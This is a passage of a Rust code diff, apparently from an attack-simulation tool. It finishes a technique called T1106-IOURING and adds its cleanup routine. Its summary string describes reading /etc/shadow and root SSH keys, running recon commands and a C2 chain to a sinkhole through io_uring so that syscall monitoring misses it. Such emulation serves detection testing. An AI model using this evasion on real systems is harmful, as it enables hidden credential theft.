+            let mut artifacts: Vec<String> = Vec::new();
+            if let Err(e) = fs::create_dir_all(&work_dir) {
+                warn!("[T1106-IOURING] could not create {work_dir}: {e}");
+            } else {
+                let body = report.join("\n");
+                if let Err(e) = fs::write(&log_path, format!("{body}\n")) {
+                    warn!("[T1106-IOURING] could not write {log_path}: {e}");
+                } else {
+                    artifacts.push(log_path.clone());
+                    artifacts.push(work_dir.clone());
+                }
+            }
+
+            let steps_ok = report.iter().filter(|l| l.starts_with("[OK]")).count();
+            let summary = format!(
+                "T1106-IOURING complete: {steps_ok} io_uring steps OK (ring_mode={ring_mode}; \
+                 reads: {target_file}, /proc/net/tcp, {utmp}{}; statx {} SUID candidates; \
+                 recon-cmd stdout via ring for {} commands; C2 chain connect->send->recv + \
+                 OP_WRITE second-channel to {sinkhole_ip}) -- all I/O via io_uring SQEs, \
+                 no equivalent openat/read/connect/recv/statx/write syscalls.",
+                if crate::utils::is_root() { ", /etc/shadow, /root/.ssh/id_*" } else { "" },
+                T1106_SUID_CANDIDATES.len(),
+                T1106_RECON_COMMANDS.len()
+            );
+            info!("{summary}");
+
+            let cleanup_required = !artifacts.is_empty();
+            Ok(SimulationResult {
+                technique_id: self.info().id,
+                success: true,
+                message: summary,
+                artifacts,
+                cleanup_required,
+            })
+        })
+    }
+
+    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
+        Box::pin(async move {
+            info!("[T1106-IOURING] Cleaning up artefacts...");
+
+            // Two-pass: files first, then directories, so per-file failures are
+            // surfaced before the wholesale directory removal.
+            let mut dirs: Vec<&String> = Vec::new();
+            for artifact in artifacts {
+                let p = Path::new(artifact);
+                if !p.exists() {
+                    continue;
+                }
+                if p.is_dir() {
+                    dirs.push(artifact);
+                    continue;
+                }
+                match fs::remove_file(artifact) {
+                    Ok(_) => info!("  [OK] Removed {artifact}"),
+                    Err(e) => warn!("  Failed to remove {artifact}: {e}"),
+                }
+            }
+            for d in dirs {
+                match fs::remove_dir_all(d) {
+                    Ok(_) => info!("  [OK] Removed dir {d}"),
+                    Err(e) => warn!("  Failed to remove dir {d}: {e}"),
+                }
+            }
+
+            info!("[T1106-IOURING] Cleanup complete");
             Ok(())
         })
     }
